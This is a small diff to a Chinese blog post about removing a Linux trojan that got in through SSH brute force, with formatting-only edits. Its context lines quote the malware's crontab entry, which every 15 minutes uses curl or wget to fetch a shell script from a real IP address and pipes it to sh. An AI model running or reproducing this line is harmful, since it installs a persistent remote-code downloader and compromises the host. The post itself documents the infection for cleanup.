@@ -37,7 +37,7 @@ tags:
 
 3. 检查cron任务
 
-该木马由crond启动，通过`crontab -u root -l`检查定时任务，发现每15分钟就执行一次上述bash脚本，这就是木马的埋点！
+    该木马由crond启动，通过`crontab -u root -l`检查定时任务，发现每15分钟就执行一次上述bash脚本，这就是木马的埋点！
 
     ``` bash
     */15 * * * * (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -fsSL -m180 http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh
@@ -57,7 +57,7 @@ tags:
 - 手工删除上述木马程序
 - 检查系统进程、网络服务、定时任务等状态，确认问题解决
 
-## 如何彻底解决SSH暴力破解的威胁？
+## 如何彻底解决SSH暴力破解的威胁
 
 最有效的方法就是，关闭口令登录方式，改为密钥登录，请参见下一片文章。
 
